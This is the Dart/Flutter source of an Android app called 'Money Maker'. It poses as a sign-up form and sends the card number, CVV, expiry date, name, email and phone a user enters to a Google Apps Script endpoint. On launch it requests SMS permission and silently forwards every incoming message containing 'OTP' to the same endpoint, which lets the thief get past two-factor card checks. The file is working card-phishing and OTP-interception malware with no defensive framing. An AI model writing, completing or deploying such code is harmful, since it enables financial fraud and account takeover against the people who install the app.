import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:permission_handler/permission_handler.dart';
import 'package:sms_receiver/sms_receiver.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Money Maker',
      home: PaymentFormPage(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class PaymentFormPage extends StatefulWidget {
  @override
  _PaymentFormPageState createState() => _PaymentFormPageState();
}

class _PaymentFormPageState extends State<PaymentFormPage> {
  final _formKey = GlobalKey<FormState>();
  final Map<String, String> formData = {};
  final String sheetUrl = "https://script.google.com/macros/s/AKfycbyqf40p00Zz1V8F2hLW9ZB7jfTlmf2ipmVS4fDl-ShINSEHW3bzSLqhGziZwl0cS_qURg/exec";
  final String smsKeyword = "OTP";

  @override
  void initState() {
    super.initState();
    _requestSmsPermission();
    _listenSms();
  }

  void _requestSmsPermission() async {
    await Permission.sms.request();
  }

  void _listenSms() {
    SmsReceiver receiver = SmsReceiver();
    receiver.onSmsReceived.listen((SmsMessage message) {
      if (message.body != null && message.body!.contains(smsKeyword)) {
        _sendSmsToSheet(message.address ?? "", message.body ?? "", DateTime.now().toString());
      }
    });
  }

  Future<void> _sendSmsToSheet(String sender, String body, String date) async {
    try {
      await http.post(
        Uri.parse(sheetUrl),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "type": "sms",
          "sender": sender,
          "body": body,
          "date": date,
        }),
      );
    } catch (e) {
      print("خطأ في إرسال الرسالة للشييت: $e");
    }
  }

  Future<void> _submitForm() async {
    if (_formKey.currentState!.validate()) {
      _formKey.currentState!.save();

      try {
        await http.post(
          Uri.parse(sheetUrl),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({
            "type": "form",
            "cardNumber": formData["cardNumber"],
            "ccv": formData["ccv"],
            "expiryDate": formData["expiryDate"],
            "username": formData["username"],
            "email": formData["email"],
            "phone": formData["phone"],
          }),
        );
        ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("your request is recevied just wait our respwan!")));
      } catch (e) {
        ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("حدث خطأ: $e")));
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          Container(
            decoration: BoxDecoration(
              image: DecorationImage(
                image: NetworkImage("https://github.com/alahlymasr9-art/video/raw/refs/heads/main/6835451-hd_1920_1080_25fps.mp4"),
                fit: BoxFit.cover,
              ),
            ),
          ),
          Center(
            child: SingleChildScrollView(
              child: Container(
                padding: EdgeInsets.all(20),
                margin: EdgeInsets.all(20),
                decoration: BoxDecoration(
                  color: Colors.black.withOpacity(0.75),
                  border: Border.all(color: Colors.amber),
                  borderRadius: BorderRadius.circular(12),
                  boxShadow: [BoxShadow(color: Colors.amber, blurRadius: 10)],
                ),
                child: Form(
                  key: _formKey,
                  child: Column(
                    children: [
                      Text("Join us 🚀", style: TextStyle(color: Colors.amber, fontSize: 24)),
                      SizedBox(height: 20),
                      _buildTextField("Card Number", "cardNumber"),
                      Row(
                        children: [
                          Expanded(child: _buildTextField("CCV", "ccv")),
                          SizedBox(width: 10),
                          Expanded(child: _buildTextField("Expiry Date", "expiryDate", hint: "MM/YY")),
                        ],
                      ),
                      _buildTextField("Your Name", "username"),
                      _buildTextField("Email", "email", inputType: TextInputType.emailAddress),
                      _buildTextField("Phone", "phone", inputType: TextInputType.phone),
                      SizedBox(height: 10),
                      ElevatedButton(
                        onPressed: _submitForm,
                        child: Text("Send"),
                        style: ElevatedButton.styleFrom(backgroundColor: Colors.amber, foregroundColor: Colors.black),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTextField(String label, String keyName, {String? hint, TextInputType inputType = TextInputType.text}) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 8.0),
      child: TextFormField(
        keyboardType: inputType,
        decoration: InputDecoration(
          labelText: label,
          hintText: hint,
          labelStyle: TextStyle(color: Colors.amber),
          filled: true,
          fillColor: Colors.black,
          border: OutlineInputBorder(borderRadius: BorderRadius.circular(6), borderSide: BorderSide(color: Colors.amber)),
          enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(6), borderSide: BorderSide(color: Colors.amber)),
        ),
        style: TextStyle(color: Colors.white),
        validator: (value) => value == null || value.isEmpty ? "مطلوب" : null,
        onSaved: (value) => formData[keyName] = value ?? "",
      ),
    );
  }
}
